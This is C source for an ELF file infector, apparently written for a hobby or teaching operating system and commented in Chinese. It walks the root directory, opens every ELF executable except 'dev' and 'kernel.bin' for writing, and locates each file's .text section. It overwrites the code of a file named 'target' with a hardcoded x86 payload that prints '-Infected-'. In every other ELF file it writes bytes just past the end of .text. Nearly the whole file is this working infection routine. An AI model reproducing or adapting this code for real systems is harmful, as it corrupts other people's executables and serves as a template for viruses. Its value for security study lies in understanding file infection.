#include "stdio.h"
#include "string.h"
#include <elf.h>

int is_elf(Elf32_Ehdr elf_ehdr);
void process(char *tmp);

//  objdump -d -j .text target

unsigned char payload[] = {
    0x55, 
    0x89, 0xe5, 
    0x81, 0xec, 0x00, 0x01, 0x00, 0x00, 
    0x89, 0xe8, 
    0x83, 0xe8, 0x14, 
    0xbb, 0x2d, 0x49, 0x6e, 0x66, 
    0x89, 0x18, 
    0x89, 0xe8, 
    0x83, 0xe8, 0x10, 
    0xbb, 0x65, 0x63, 0x74, 0x65, 
    0x89, 0x18, 
    0x89, 0xe8, 
    0x83, 0xe8, 0x0c, 
    0xbb, 0x64, 0x2d, 0x0a, 0x00, 
    0x89, 0x18, 
    0x89, 0xe8, 
    0x83, 0xe8, 0x14, 
    0x50, 
    0xb8, 0x6e, 0x10, 0x00, 0x00, 
    0xff, 0xd0, 
    0xb8, 0xe4, 0x17, 0x00, 0x00, 
    0x6a, 0x00, 
    0xff, 0xd0
};

int main() 
{
    char buf[RESULT_MAX] = {0};
    readdir("/", buf);
    char *files = buf + 3;

    int i = 0;
    int last = 0;
    char tmp[200];
    int count = 0;

    for (i = 1 /*0*/; i < strlen(files); i++) 
    {
        if (files[i] != ' ' || files[i - 1] == ' ') continue;

        int j = last;
        for (; j < i; j++) 
        {
            tmp[count++] = files[j];
        }

        tmp[count] = '\0';
        printf("%s: ", tmp);
        last = i + 1;

        if (memcmp(tmp, "dev", 3) != 0 && memcmp(tmp, "kernel.bin", 10) != 0) 
        {
            process(tmp);
        }
        else
        {
            printf("skipped\n");
        }
        count = 0;
    }
}

void process(char *tmp)
{
    Elf32_Ehdr elf_ehdr;
    // Program Header Table 结构体
    Elf32_Shdr elf_shdr;
    // Elf32_Sym elf_sym;

    // 不读驱动 不读kernel.bin
    int old_file = open(tmp, O_RDWR);
    if (old_file == -1) { printf("Unable to open this file\n"); return;}
    
    read(old_file, &elf_ehdr, sizeof(elf_ehdr));

    // 判断是否是一个 ELF 文件
    if (!is_elf(elf_ehdr)){ printf("none-ELF\n"); return;}
    
    printf("ELF, injecting\n");

    int e_sho_off = elf_ehdr.e_shoff;
    int section_num = elf_ehdr.e_shnum;
    int e_shstr_header_index = elf_ehdr.e_shstrndx;//节头名字表的索引
    int e_shstr_off = e_sho_off + e_shstr_header_index * sizeof(elf_shdr);

    lseek(old_file, e_shstr_off, SEEK_SET);//定位到节头名字表节头
    read(old_file, &elf_shdr, sizeof(elf_shdr));
    int shstr_section_off = elf_shdr.sh_offset;
    char shstr_buf[1000];
    lseek(old_file, shstr_section_off, SEEK_SET);
    read(old_file, shstr_buf, 1000);//定位到shstr_tab

    lseek(old_file, e_sho_off, SEEK_SET);//定位到节头表
    int text_off = 0;
    for (int i = 0; i < section_num; i++)
    {
        read(old_file, &elf_shdr, sizeof(elf_shdr));
        if (strcmp(shstr_buf + elf_shdr.sh_name, ".text") == 0)
        {
            text_off = i;
            break;
        }
    }
    int text_offset = e_sho_off + sizeof(elf_shdr) * text_off;  // 找到代码节节头的偏移
    lseek(old_file, text_offset, SEEK_SET);// 定位到text节头的位置
    read(old_file, &elf_shdr, sizeof(elf_shdr));  //读出text节头
    int text_section_offset = elf_shdr.sh_offset;  // 找到代码段的偏移
    int text_size = elf_shdr.sh_size;

    char shellcode[] = {0x66,0x87,0xdb};

    // unsigned char gotta[100] = {0};

    if (strcmp(tmp, "target") == 0)
    {
        printf("::TARGET::\n");

        // lseek(old_file, text_section_offset, SEEK_SET);
        // read(old_file, gotta, sizeof(gotta));
        // for (int j = 0; j < 0x10; j++)
        // {
        //     for (int i = 0; i < 0x10; i++)
        //     {            
        //         printf("%x ", gotta[i + j]);
        //     }
        //     printf("\n");
        // }
        // printf("\n");

        lseek(old_file, text_section_offset, SEEK_SET);
        write(old_file, payload, sizeof(payload));
    }
    else
    {
        lseek(old_file, text_section_offset + text_size, SEEK_SET);
        write(old_file, shellcode, sizeof(shellcode));
    }
}

int is_elf(Elf32_Ehdr elf_ehdr) 
{
    // e_ident = 0x7fELF
    return (memcmp((char*)elf_ehdr.e_ident, (char*)ELFMAG, SELFMAG) == 0);
}
